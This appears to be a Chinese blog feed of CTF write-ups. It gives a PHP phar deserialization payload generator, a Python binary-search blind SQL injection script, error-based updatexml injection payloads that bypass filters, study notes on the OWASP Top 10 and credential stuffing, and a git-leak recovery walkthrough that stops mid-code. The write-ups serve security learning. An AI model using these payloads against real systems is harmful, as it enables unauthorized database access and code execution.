<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> C1e4r();</span><br><span class="line">$b = <span class="keyword">new</span> Show();</span><br><span class="line">$c = <span class="keyword">new</span> Test();</span><br><span class="line"></span><br><span class="line">$c-&gt;params[<span class="string">&#x27;source&#x27;</span>] = <span class="string">&quot;/var/www/html/f1ag.php&quot;</span>;</span><br><span class="line">$b-&gt;str[<span class="string">&#x27;str&#x27;</span>] = $c;</span><br><span class="line">$a-&gt;str = $b;</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//创建.phar文件</span></span><br><span class="line">$phar-&gt;startBuffering();<span class="comment">//写入缓冲</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="comment">//固定</span></span><br><span class="line">$phar-&gt;setMetadata($a); <span class="comment">//传入C1e4r对象</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//生成签名</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>需要修改php.ini中的phar.readonly，且一定要去掉前面的分号！……</p>
</blockquote>
<p>上传文件名：$filename = md5($_FILES[“file”][“name”].$_SERVER[“REMOTE_ADDR”]).”.jpg”;</p>
<p>move_uploaded_file($_FILES[“file”][“tmp_name”],”upload/“ . $filename); 转移到指定的upload目录</p>
<p>生成phar后改后缀为jpg，上传</p>
<img src="/images/SWPUCTF-2018-SimplePHP/image-20210504164131263.png" alt="image-20210504164131263" style="zoom:80%;">

<p>用phar协议去读取：</p>
<p>phar://upload/febdf38ac03e62cb8f05d46cefefd732.jpg</p>
<p><img src="/images/SWPUCTF-2018-SimplePHP/image-20210504164935877.png" alt="image-20210504164935877"></p>
<blockquote>
<?php 
    //$a = 'flag{e89a6b68-6755-4537-85ec-b9f47eb51ab3}';
 ?>
</blockquote>
<p>得到flag……</p>
</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-05-04  <a class="commentCountImg" href="/2021/05/04/GYCTF2020-Ezsqli/#comment-container"><span class="display-none-class">/2021/05/04/GYCTF2020-Ezsqli/</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="eb221418d090b41259604dfeeb93e4bc">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>3 分钟  <i class="fas fa-pencil-alt"> </i>0.5 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/05/04/GYCTF2020-Ezsqli/">GYCTF2020-Ezsqli</a></h1><div class="content"><h3><span id="gyctf2020ezsqli">[GYCTF2020]Ezsqli</span></h3><p>id是注入点，4/2发现是数值型注入……测试下：</p>
<img src="/images/GYCTF2020-Ezsqli/image-20210504093103645.png" alt="image-20210504093103645" style="zoom:80%;">

<p>information都被过滤了……这里必须要绕过这个过滤</p>
<h3><span id="information_schema绕过">information_schema绕过</span></h3><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193512">聊一聊bypass information_schema</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_49835838/article/details/109159839">mysql注入绕过information_schema过滤</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4a084ea1c7d4">information_schema代替方法</a></p>
<h4><span id="sysschema_table_statistics_with_buffer">sys.schema_table_statistics_with_buffer</span></h4><p>SELECT * from sys.schema_table_statistics_with_buffer</p>
<table>
<thead>
<tr>
<th align="left">table_schema</th>
<th align="left">table_name</th>
<th align="right">rows_fetched</th>
<th align="left">fetch_latency</th>
<th align="right">rows_inserted</th>
<th align="left">insert_latency</th>
<th align="right">rows_updated</th>
<th align="left">update_latency</th>
<th align="right">rows_deleted</th>
<th align="left">delete_latency</th>
<th align="right">io_read_requests</th>
<th align="left">io_read</th>
<th align="left">io_read_latency</th>
<th align="right">io_write_requests</th>
<th align="left">io_write</th>
<th align="left">io_write_latency</th>
<th align="right">io_misc_requests</th>
<th align="left">io_misc_latency</th>
<th align="left">innodb_buffer_allocated</th>
<th align="left">innodb_buffer_data</th>
<th align="left">innodb_buffer_free</th>
<th align="right">innodb_buffer_pages</th>
<th align="right">innodb_buffer_pages_hashed</th>
<th align="right">innodb_buffer_pages_old</th>
<th align="right">innodb_buffer_rows_cached</th>
</tr>
</thead>
<tbody><tr>
<td align="left"></td>
<td align="left"></td>
<td align="right"></td>
<td align="left"></td>
<td align="right"></td>
<td align="left"></td>
<td align="right"></td>
<td align="left"></td>
<td align="right"></td>
<td align="left"></td>
<td align="right"></td>
<td align="left"></td>
<td align="left"></td>
<td align="right"></td>
<td align="left"></td>
<td align="left"></td>
<td align="right"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="right"></td>
<td align="right"></td>
<td align="right"></td>
<td align="right"></td>
</tr>
</tbody></table>
<p>可以看到有table_schema和table_name，借此可以获得表名：</p>
<img src="/images/GYCTF2020-Ezsqli/image-20210504101705740.png" alt="image-20210504101705740" style="zoom:80%;">

<p>但是我们没有列名，这里需要</p>
<h3><span id="无列名注入">无列名注入</span></h3><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4a084ea1c7d4">https://www.jianshu.com/p/4a084ea1c7d4</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/98206699">https://zhuanlan.zhihu.com/p/98206699</a></p>
<p>运用到sql比较字符串的特性，当两个字符串做比较运算时，会先比较首位字符，若首位相同，则比较第二位……</p>
<blockquote>
<p>id=2||((select 1,”g”)&gt;(select * from f1ag_1s_h3r3_hhhhh))#</p>
<p>两边查询的列数要相同</p>
</blockquote>
<p>捋顺逻辑用二分法写脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://bec2be36-f01b-4b15-bc93-dc44e0b9fbb6.node3.buuoj.cn/&quot;</span></span><br><span class="line"></span><br><span class="line">data1 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 库名</span></span><br><span class="line">data2 = <span class="string">&quot;2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;&#125;,1))&gt;=&#123;&#125;#&quot;</span></span><br><span class="line"><span class="comment"># 表名</span></span><br><span class="line">data3 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 列名</span></span><br><span class="line">data4 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 数据</span></span><br><span class="line">data5 = <span class="string">&quot;2||((select 1,&#x27;&#123;&#125;&#x27;)&lt;=(select * from f1ag_1s_h3r3_hhhhh))#&quot;</span></span><br><span class="line"><span class="comment"># 字符串移位比较+无列名</span></span><br><span class="line">data = data5</span><br><span class="line"><span class="comment"># 选择post数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> r &gt; l:</span><br><span class="line">        mid = <span class="built_in">int</span>((l + r + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        x = <span class="built_in">str</span>(x)</span><br><span class="line">        y = <span class="built_in">str</span>(mid)</span><br><span class="line">        <span class="keyword">if</span> data != data5:</span><br><span class="line">            pay = &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: data.<span class="built_in">format</span>(x, y)</span><br><span class="line">                   &#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pay = &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: data.<span class="built_in">format</span>(flag+<span class="built_in">chr</span>(<span class="built_in">int</span>(y)))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># print(pay)</span></span><br><span class="line">        <span class="comment"># 这里需更改注入点</span></span><br><span class="line">        response = requests.post(url=url, data=pay)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid - <span class="number">1</span></span><br><span class="line">        <span class="comment"># time.sleep(0.03)</span></span><br><span class="line">    flag += (<span class="built_in">chr</span>(<span class="built_in">int</span>(r)))</span><br><span class="line">    print(<span class="built_in">chr</span>(<span class="built_in">int</span>(r)))</span><br><span class="line">    print(flag)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>搭了个post架，也不知道好不好用……</p>
</blockquote>
<img src="/images/GYCTF2020-Ezsqli/image-20210504112734844.png" alt="image-20210504112734844" style="zoom:80%;">

<p>转小写得到flag……</p>
<p>flag{333ed6af-c961-438b-91fd-c578e87536a6}</p>
</div><div class="index-category-tag">  <hr></div></article></div><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-04-25  <a class="commentCountImg" href="/2021/04/25/RCTF2015-EasySQL/#comment-container"><span class="display-none-class">/2021/04/25/RCTF2015-EasySQL/</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="59d8af43d29b96f0d264ba5c696aa26b">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>4 分钟  <i class="fas fa-pencil-alt"> </i>0.5 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/25/RCTF2015-EasySQL/">RCTF2015-EasySQL</a></h1><div class="content"><h3><span id="rctf2015easysql">[RCTF2015]EasySQL</span></h3><p>进入题目是一个登录页面，有注册和修改密码功能……似乎有index.phps源码，但是forbidden</p>
<p>发现admin已经被注册……难道可以先注入获取admin账户再得到源码进一步渗透？</p>
<p>注册一个<code>\</code>,在change密码时发生报错：</p>
<p><img src="/images/RCTF2015-EasySQL/image-20210425120947836.png" alt="image-20210425120947836"></p>
<p>pwd后的一串是0的md5值……</p>
<p>这可能是二次注入，在拿出数据时没有进行转义发生的漏洞，鉴于打印了报错信息，即可进行报错注入</p>
<p>类似之前的题构造，但是用户名存在过滤，首次尝试fuzz操作……</p>
<img src="/images/RCTF2015-EasySQL/image-20210425121328003.png" alt="image-20210425121328003" style="zoom:80%;">

<p>过滤了很多……</p>
<p><code>&quot;&amp;&amp;pwd=updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</code>成功回显数据库名</p>
<p><code>&quot;&amp;&amp;pwd=updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666c6167)),0x7e),1)#</code>获取表名</p>
<img src="/images/RCTF2015-EasySQL/image-20210425121530565.png" alt="image-20210425121530565" style="zoom:80%;">

<p>发现flag表</p>
<img src="/images/RCTF2015-EasySQL/image-20210425121603887.png" alt="image-20210425121603887" style="zoom:80%;">

<p>flag列</p>
<img src="/images/RCTF2015-EasySQL/image-20210425121624544.png" alt="image-20210425121624544" style="zoom:80%;">

<p>fakeflag……那去查查user表</p>
<img src="/images/RCTF2015-EasySQL/image-20210425121710797.png" alt="image-20210425121710797" style="zoom:80%;">

<p>应该是real_flag_1s_here，似乎有多行……concat</p>
<img src="/images/RCTF2015-EasySQL/image-20210425121803527.png" alt="image-20210425121803527" style="zoom:80%;">

<p>这样的查询表明，很多行的数据都是xxx，而flag应当在其中一行</p>
<blockquote>
<p>limit似乎用不了，很多加密也不行，mid、substr、right、left都被ban了……</p>
</blockquote>
<p>学习了正则的使用：</p>
<p><code>&quot;&amp;&amp;pwd=updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(select(real_flag_1s_here)regexp(&#39;^l&#39;))),0x7e),1)#</code></p>
<p>或</p>
<p><code>&quot;&amp;&amp;pwd=updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)),0x7e),1)#</code></p>
<p>where(real_flag_1s_here)regexp(‘^f’)匹配real_flag_1s_here列中以f开头的那一行数据，大概是优先于group_concat的，所以也可以：</p>
<blockquote>
<p>“&amp;&amp;pwd=updatexml(1,concat(0x7e,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(‘^f’)),0x7e),1)#</p>
</blockquote>
<p>怎么解决位数不足显示不全的问题呢？正则帮助我们拿出了这一行的数据，我们就可以将这行数据逆向输出</p>
<h4><span id="reverse">reverse</span></h4><p><code>&quot;&amp;&amp;pwd=updatexml(1,concat(0x7e,(reverse((select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))),0x7e),1)#</code></p>
<blockquote>
<p>XPATH syntax error: ‘~flag{4c5c3709-12d5-40af-82f2-c3’</p>
<p>XPATH syntax error: ‘~}8f414a13433c-2f28-fa04-5d21-90’</p>
<p>&lt;php？echo strrev(“}8f414a13433c-2f28-fa04-5d21-90”);</p>
</blockquote>
<p>flag{4c5c3709-12d5-40af-82f2-c33431a414f8}</p>
<p>获得flag……</p>
</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-04-24  <a class="commentCountImg" href="/2021/04/24/hacker101-1/#comment-container"><span class="display-none-class">/2021/04/24/hacker101-1/</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="478de037f298d8ee969e30a006066208">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>9 分钟  <i class="fas fa-pencil-alt"> </i>1.3 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/24/hacker101-1/">hacker101.1</a></h1><div class="content"><h5><span id="hacker1011">hacker101.1</span></h5><p>2.观看视频二，回答下列问题：</p>
<p>视频二：<a target="_blank" rel="noopener" href="https://www.hacker101.com/sessions/pentest_owasp">https://www.hacker101.com/sessions/pentest_owasp</a> </p>
<p>1.目前owasp的十大web安全漏洞是哪些？这些漏洞排名是按照漏洞的严重程度排序的还是按照漏洞的常见程度排序的？（2分） </p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://wiki.owasp.org/images/d/dc/OWASP_Top_10_2017_%E4%B8%AD%E6%96%87%E7%89%88v1.3.pdf">中文PDF-2017</a></p>
<ol>
<li><p><strong>注入漏洞：</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#Injection">Injection</a></p>
</li>
<li><p><strong>身份认证失效：</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#Authentication">Broken Authentication</a></p>
</li>
<li><p><strong>敏感数据泄露：</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#Data">Sensitive Data Exposure</a></p>
</li>
<li><p><strong>XML外部实体漏洞：</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#XML">XML External Entities (XXE)</a></p>
</li>
<li><p><strong>访问控制失效：</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#Access">Broken Access Control</a></p>
</li>
<li><p><strong>安全配置错误：</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#Misconfigurations">Security Misconfigurations</a></p>
</li>
<li><p><strong>跨站脚本攻击：</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#XSS">Cross-Site Scripting (XSS)</a></p>
</li>
<li><p><strong>不安全的反序列化：</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#Deserialization">Insecure Deserialization</a></p>
</li>
<li><p><strong>使用含有已知漏洞的组件：</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#Vulnerabilities">Using Components with Known Vulnerabilities</a></p>
</li>
<li><p><strong>日志和监控不足：</strong><a target="_blank" rel="noopener" href="https://www.immuniweb.com/resources/owasp-top-ten/#Insufficient">Insufficient Logging and Monitoring</a></p>
<p><strong><em>OWASP Top 10 is a ranking of the ten most dangerous information security risks for web applications, compiled by a community of industry experts. For each point of the rating, the risk is calculated by experts based on the<a target="_blank" rel="noopener" href="https://owasp.org/www-project-risk-assessment-framework/">OWASP Risk Rating Methodology</a>and includes an assessment of Weakness Prevalence, Weakness Detectability and Exploitability, as well as the criticality of the consequences of their operation or Technical Impacts.</em></strong></p>
<p><strong>前10大风险项是根据流行数据选择和优先排序，并结合了对可利用性、可检测性和影响程度的一致性评估而形成。</strong></p>
</li>
</ol>
</blockquote>
<p>2.请翻译一下credential stuffing（1分） </p>
<blockquote>
<p>​    <strong><em>one that’s really common from a pentesting perspective is what we call credential stuffing. And say that we go out we grab data from breached data that’s out there so an account that’s been compromised the list shows up on the internet and now, the hackers have access to usernames and passwords and say we are testing in some website.</em></strong></p>
<p>​    <strong><em>we just send usernames and passwords to an application ,and there’s no threat detection we’re just able to pound a login form or even use something like password spraying where we just take something like spring 2019 or summer 2020 exclamation and just throw common credentials out there and see if it sticks if we’re able to continuously brute force  an application without anything preventing us or any account lockouts.</em></strong></p>
<p>emm，实际上就是撞库吗……</p>
<p>利用已泄露的账户信息在多个平台进行尝试，这种尝试很难被检测出来。不同的用户名与密码，甚至于手机号，身份证号等等敏感信息进行组合来尝试登录。可能用户在多个平台的账户与密码是相同的，这样就十分危险。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44549063/article/details/113518965"><strong>Credential Stuffing Attack</strong></a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/still_night/article/details/104837926">Beyond credential stuffing</a></p>
</blockquote>
<p>3.为什么说不充分的日志记录(insufficient logging)也算owasp十大漏洞的一种？他的危害性如何（2分） </p>
<blockquote>
<p> 之所以有很多入侵行为发生，其中原因之一是没有行为监管，或监管不充分。入侵者r进入系统然而没有日志记录这一行为，或日志记录不充分。</p>
<p>所以，在做一些项目时，检查日志与监控是十分重要的。不充分的日志记录与监管可能会导致很多入侵行为的发生。</p>
</blockquote>
<p>4.请翻阅一下owasp testing guide，以及owasp testing guide check-list，视频说怎么结合这两个文档来学习渗透测试？ 结合你平时渗透过程中的经验，谈谈你的感想。（3分） </p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://kennel209.gitbooks.io/owasp-testing-guide-v4/content/zh/frontispiece/index.html">中文版testing-guide</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/tanprathan/OWASP-Testing-Checklist">https://github.com/tanprathan/OWASP-Testing-Checklist</a></p>
<p>从testing guide中，我们可以了解到所有的不同的渗透测试一个网站应用的方法。check-list可以提供我们在测试中所有要检查的点，并为这些点提供测试工具。check-list中的测试点可拿到testing guide中检索得到更为详尽的信息与总结，search engine、operator……and step by step。</p>
<p>emmm，速查与教科书的关系……？渗透测试是开卷的，速查与教科书就显得十分重要……                                                                                                                               我们需要清楚应用工作的方式，熟悉测试的逻辑，而check-list和testing-guide负责帮助我们理顺逻辑并记忆基础测试点。</p>
<p>从思考与逻辑出发，最终落实到check-list and testing-guide。check-list and testing-guide帮助我们查漏补缺。</p>
</blockquote>
<ol start="5">
<li>you are only as good as you notes   you are only as good as things you can refer to结合这两句话谈谈你的感想。（2分）</li>
</ol>
<blockquote>
<p>挺好……owasp提供了很好的资源，各种test-guiding，hacker101也提供了很好的学习资源（包括英语……</p>
<p>写博客这么长时间，感觉也确实有用。包括资料查找、记录payload、各种知识点……我们所记录的、可参考的东西是记忆可靠的延伸。</p>
</blockquote>
</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-04-24  <a class="commentCountImg" href="/2021/04/24/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/#comment-container"><span class="display-none-class">/2021/04/24/网鼎杯-2018-Comment/</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="a0a91c94781162f02eeee57613eb8ffc">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>8 分钟  <i class="fas fa-pencil-alt"> </i>1.2 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/24/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment/">网鼎杯-2018-Comment</a></h1><div class="content"><h3><span id="网鼎杯-2018comment">[网鼎杯 2018]Comment</span></h3><p>学习了不少知识…………</p>
<p>进入题目是一个留言板，留言需要登录，先不管……发现存在git泄露，上githack：</p>
<p>write_do：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>关键这玩意没啥用啊……学习一波git恢复</p>
<blockquote>
<p>gitExtract工具似乎会自动恢复泄露文件……回去试试……</p>
</blockquote>
<h4><span id="git恢复">git恢复</span></h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/wangding_4th_game_web_writeup.html">https://www.cnblogs.com/iamstudy/articles/wangding_4th_game_web_writeup.html</a></p>
<p><a href="%5Bhttps://blog.csdn.net/edric1261234/article/details/82796506?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&dist_request_id=1332041.9234.16192377503140215&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control%5D(https://blog.csdn.net/edric1261234/article/details/82796506?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&dist_request_id=1332041.9234.16192377503140215&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control)">git reset 使用及回滚</a></p>
<p><a target="_blank" rel="noopener" href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/0013745374151782eb658c5a5ca454eaa451661275886c6000">git的工作区和暂存区</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/jjlovefj/article/details/86476925">git log 详解</a></p>
<img src="/images/网鼎杯-2018-Comment/image-20210425204527594.png" alt="image-20210425204527594" style="zoom:80%;">

<blockquote>
<p>提交一个文件的时候是分为<code>git add</code>、<code>git commit</code>两步的<br>当<code>git add</code>的时候，是把文件临时放在临时区stage中<br>当<code>git commit</code>的时候，是把临时区stage的所有内容提交到当前分支<br>当然这两个在objects目录都会生成一个对象文件，来存储数据。</p>
<p>我们使用 git add 命令将内容写入暂存区。                                                                                                                   git commit 命令会将暂存区内容添加到本地仓库中</p>
</blockquote>
<p>这里要结合GitHacker使用，githacker似乎在获取泄露文件上能够获取到更详尽的信息。</p>
<blockquote>
<p>个人体验：GitHacker要在linux上用，需要python的requests……</p>
</blockquote>
<p>这里我们通过：git log查看commit history：</p>
<img src="/images/网鼎杯-2018-Comment/image-20210424151445916.png" alt="image-20210424151445916" style="zoom:80%;">

<p>git reset回滚未commit版本前已经commit的网页源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span 